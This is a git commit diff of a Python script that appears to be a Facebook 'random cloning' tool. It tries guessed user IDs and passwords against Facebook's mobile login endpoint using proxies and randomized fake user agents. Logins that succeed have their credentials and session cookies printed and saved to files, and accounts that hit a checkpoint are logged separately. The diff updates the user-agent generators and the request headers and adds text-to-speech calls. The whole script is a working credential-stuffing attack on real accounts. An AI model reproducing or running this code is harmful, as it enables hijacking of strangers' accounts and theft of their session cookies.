dc929712b3c4c3a15d0b642c9489b27b5ea960a1
Həʌɽtləss Bøy <83134640+Fucker-404@users.noreply.github.com>
2023-11-08 18:56:02 +0600

    Update rdx.py

--- rdx.py
+++ rdx.py
@@ -1,8 +1,9 @@
- import os,sys,time,json,random,re,string,platform,base64,uuid
+import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
 from datetime import date
+os.system("pkg install espeak")
 from datetime import datetime
 from time import sleep
 from os import system as s
@@ -30,26 +31,33 @@ try:
 except Exception as e:
  print('')
 proxy=open('.prox.txt','r').read().splitlines()
-for xd in range(10000):
-    a='Nokia'
-    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    c=random.randrange(1, 99)
-    d='/GoBrowser/'
-    e='1.6.0.'
-    f=random.randrange(1, 99)
-    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+for ua in range(5000):
+    a='NokiaX'
+    b=random.randrange(1,9)
+    c='-0'
+    d=random.randrange(1,9)
+    e='/'
+    f=random.randrange(1,9)
+    g='.0 ('
+    h=random.randrange(1,12)
+    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+    j='UNTRUSTED/'
+    k=random.randrange(1,3)
+    l='.0'
+    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
     ugen.append(uaku2)
-for rr in range (10000):
-  a='Mozilla/5.0 (Linux; Android'
-  b=random.choice (['4','5','6','7','8','9','10','11','12','13','14','15'])
-  c='SM-M136B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-  d=random. randrange(40,115)
-  e='0'
-  f=random. randrange(3000,6000)
-  g=random. randrange(20,100)
-  h='Mobile Safari/537.36'
-  ua=f'{a} {b}; {c}{d}, {e}, {f}, {g} {h}'
-  ugen. append(ua)
+    
+for an in range(10000):
+	 a='Mozilla/5.0 (Linux; Android'
+	 b=random. choice(['3','4','5','6','7','8','9','10','11','12','13','14','15'])
+	 c='SM-G981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	 d=random. randrange(40,115)
+	 e='0'
+	 f=random. randrange(3000,6000)
+	 g=random. randrange(20,100)
+	 h='Mobile Safari/537.36'
+	 ua=f'{a} {b}; {c}{d}. {e}. {f}. {g} {h}'
+	 ugen. append(ua)
     
 logo=("""
 \x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
@@ -67,6 +75,7 @@ logo=("""
 \x1b[1;88m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m0.1.0
 \033[1;33m═════════════════════════════════════════════
 """)
+os.system('espeak -a 400 "welcome to mahfuz random cloning tool"')
 A = '\x1b[1;97m' 
 B = '\x1b[1;96m' 
 C = '\x1b[1;91m' 
@@ -131,41 +140,44 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-    'lmethod': 'GET',
-    'scheme': 'https', 
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'dpr': '1.7937500476837158',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Primo H9 Pro"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent':pro,
-    'viewport-width': '980',
+            header_freefb={'authority': 'x.facebook.com',
+            'method':'POST',
+            'path':'/?tbua=1',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '3',
+            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=Afd6JVcRrTcQqwX6lyrjpp19ylOU3PXp-TTRU1Kn6Wr_Ka8ZhPTAOmpmIpBcdltAQPd8mJ01NcScE1qxBYalKBPKI9WWpBynAT9er6_KM9WtsQ&smuh=5098&lh=Ac9VnQrCvqzwZt2Cofs&wtsid=rdr_0QYTnJIJgn5ECrdhC&_rdr',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"vivo 1935"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,
+            'viewport-width': '980',
 }
+            
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\033[38;5;46m[RDX-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
+                print(f"\033[38;5;46m[RDX-OK☠️] {uid} • {ps}" ' \n\033[1;33m [🧑🏻‍💻]\033[1;33mCookie = \033[1;32m'+coki+  ' \n')
                 open('/sdcard/RDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[RDX-💔] {uid} • {ps}")
+                print(f"\x1b[38;5;196m[RDX-🤣] {uid} • {ps}")
                 open('/sdcard/RDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
